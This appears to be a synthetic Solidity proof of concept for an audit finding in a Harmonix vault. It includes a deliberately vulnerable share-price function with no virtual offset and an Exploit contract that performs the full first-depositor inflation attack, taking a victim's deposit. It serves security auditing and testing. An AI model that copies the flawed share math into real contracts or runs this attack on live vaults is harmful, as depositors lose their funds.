// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Harmonix FundContract — first depositor inflates the share price
    (Shieldify, Harmonix Finance Hyperliquid, finding 57883 / C-01).
    SYNTHETIC, cheatcode-free. _updateNav is the audited function (@> VULN).

    Share price is nav * 10**decimals / totalSupply, with no virtual offset.
    The attacker deposits 2 wei, withdraws 1 wei of shares, and donates
    1,000 assets straight into the balance contract. The next depositor
    pays 100 assets and receives 0 shares. The attacker redeems the
    remaining 1 share and takes both the donation and the victim's 100.

    The control adds a virtual offset of 10**3 in the share conversion,
    so the same second deposit mints a non-zero share balance. */

contract AssetToken {
    string public name = "Harmonix asset";
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BalanceBox {
    AssetToken public asset;
    address public fund;

    constructor(address _asset) {
        asset = AssetToken(_asset);
    }

    function bind(address _fund) external {
        require(fund == address(0), "bound");
        fund = _fund;
    }

    function pay(address to, uint256 amount) external {
        require(msg.sender == fund, "fund");
        asset.transfer(to, amount);
    }
}

contract FundContract {
    AssetToken public asset;
    address public balanceContract;
    uint256 internal _totalSupply;
    uint256 public pricePerShare;
    uint256 public withdrawPoolAmount;
    uint256 public excludedTradingFee;
    mapping(address => uint256) public balanceOf;

    constructor(address _asset, address _box) {
        asset = AssetToken(_asset);
        balanceContract = _box;
        BalanceBox(_box).bind(address(this));
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function sharesOf(address account) external view returns (uint256) {
        return balanceOf[account];
    }

    function getFundNavValue() public pure returns (uint256) {
        return 0;
    }

    function _updateNav() internal {
        uint256 nav = getFundNavValue() +
            asset.balanceOf(balanceContract) +
            withdrawPoolAmount -
            excludedTradingFee;
        // @> VULN: price is nav / supply with no virtual offset. A direct donation inflates it until the next deposit rounds to 0 shares.
        uint256 newPricePerShare = (nav * 10 ** decimals()) / totalSupply();
        pricePerShare = newPricePerShare;
    }

    function deposit(uint256 _amount, address _receiver) public returns (uint256 shares) {
        asset.transferFrom(msg.sender, balanceContract, _amount);
        if (_totalSupply == 0) {
            shares = _amount;
            pricePerShare = 10 ** decimals();
        } else {
            _updateNav();
            shares = (_amount * 10 ** decimals()) / pricePerShare;
        }
        _totalSupply += shares;
        balanceOf[_receiver] += shares;
    }

    function withdraw(uint256 shares) public returns (uint256 assetsOut) {
        require(balanceOf[msg.sender] >= shares, "shares");
        _updateNav();
        assetsOut = (shares * pricePerShare) / (10 ** decimals());
        balanceOf[msg.sender] -= shares;
        _totalSupply -= shares;
        BalanceBox(balanceContract).pay(msg.sender, assetsOut);
    }
}

contract Victim {
    AssetToken public asset;
    FundContract public fund;

    constructor(address _asset, address _fund) {
        asset = AssetToken(_asset);
        fund = FundContract(_fund);
    }

    function deposit(uint256 amount) external returns (uint256 shares) {
        asset.approve(address(fund), amount);
        shares = fund.deposit(amount, address(this));
    }
}

contract Exploit {
    uint256 public constant DONATION = 1000e18;
    uint256 public constant VICTIM_DEPOSIT = 100e18;

    AssetToken public asset; // nonce 1
    BalanceBox public box; // nonce 2
    FundContract public fund; // nonce 3
    Victim public victim; // nonce 4

    uint256 public victimShares;
    uint256 public attackerProfit;
    uint256 public priceAfterDonation;

    constructor() {
        asset = new AssetToken();
        box = new BalanceBox(address(asset));
        fund = new FundContract(address(asset), address(box));
        victim = new Victim(address(asset), address(fund));
        asset.mint(address(this), DONATION + 2);
        asset.mint(address(victim), VICTIM_DEPOSIT);
    }

    function run() external {
        uint256 startBalance = asset.balanceOf(address(this));
        require(startBalance == DONATION + 2, "attacker funding");
        require(fund.balanceOf(address(victim)) == 0, "victim already in");

        asset.approve(address(fund), type(uint256).max);
        uint256 firstShares = fund.deposit(2, address(this));
        require(firstShares == 2, "first deposit shares");

        uint256 pulled = fund.withdraw(1);
        require(pulled == 1, "partial withdraw");
        require(fund.balanceOf(address(this)) == 1, "one share left");
        require(asset.balanceOf(address(box)) == 1, "one wei left in the box");

        this.donate();
        priceAfterDonation = _price();
        require(priceAfterDonation > 10 ** 18, "price not inflated");

        uint256 minted = victim.deposit(VICTIM_DEPOSIT);
        victimShares = fund.sharesOf(address(victim));
        require(minted == 0, "victim mint");
        require(victimShares == 0, "victim shares");

        uint256 taken = fund.withdraw(1);
        attackerProfit = asset.balanceOf(address(this)) - startBalance;
        require(taken == DONATION + VICTIM_DEPOSIT + 1, "did not take both");
        require(attackerProfit == VICTIM_DEPOSIT, "profit is not the victim deposit");
        require(asset.balanceOf(address(victim)) == 0, "victim kept assets");
        require(fund.totalSupply() == 0, "shares remain");
    }

    function donate() external {
        asset.transfer(address(box), DONATION);
    }

    function _price() internal view returns (uint256) {
        uint256 nav = asset.balanceOf(address(box));
        return (nav * 10 ** 18) / fund.totalSupply();
    }
}
